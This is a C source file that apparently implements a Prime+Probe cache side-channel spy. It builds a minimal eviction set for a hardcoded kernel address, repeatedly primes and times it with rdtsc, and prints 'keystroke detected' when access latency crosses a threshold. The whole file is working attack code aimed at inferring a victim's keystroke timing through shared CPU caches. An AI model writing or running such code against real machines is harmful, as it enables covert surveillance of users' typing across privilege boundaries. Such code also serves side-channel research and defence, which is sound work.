#include "../lib/eviction.h"
#include "../lib/utils.h"
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define WAIT_CYCLES 20000
#define ARCHES_ASSOC 12
#define EVERGLADES_ASSOC 16

CacheLineSet *cl_set;
EvictionSet *es;
void handle_sigint(int sig) {
  deep_free_cl_set(cl_set);
  deep_free_es(es);
  exit(0);
}

void probe(EvictionSet *es, NumList *nl) {
  // Assume associativity is 12
  uint64_t t0 = rdtsc_begin();
  CacheLine *iter = es->head;
  uint64_t t1 = rdtsc_end();
  push_num(nl, t1 - t0);

  for (int i = 0; i < es->size - 1; i++) {
    t0 = rdtsc_begin();
    iter = iter->next;
    t1 = rdtsc_end();
    push_num(nl, t1 - t0);
  }
}

int main(void) {
  signal(SIGINT, handle_sigint);
  uint64_t target_addr = 0xffffffff8fc91050;
  cl_set = new_cl_set();

  uint64_t threshold = detect_flush_reload_threshold();
  if (!get_minimal_set((uint8_t *)target_addr, &cl_set, threshold)) {
    printf("Error. Failed to generate minimal eviction set.\n");
  }

  es = new_eviction_set(cl_set);
  while (1) {
    access_set(es); // prime
    uint64_t t = rdtsc_begin();
    while (rdtsc_end() - t < WAIT_CYCLES)
      sched_yield();

    NumList *timings = new_num_list(EVERGLADES_ASSOC);
    probe(es, timings);
    if (max(timings) > threshold) {
      printf("keystroke detected\n");
    }
    usleep(150000); // sleep for 150 ms
  }
}
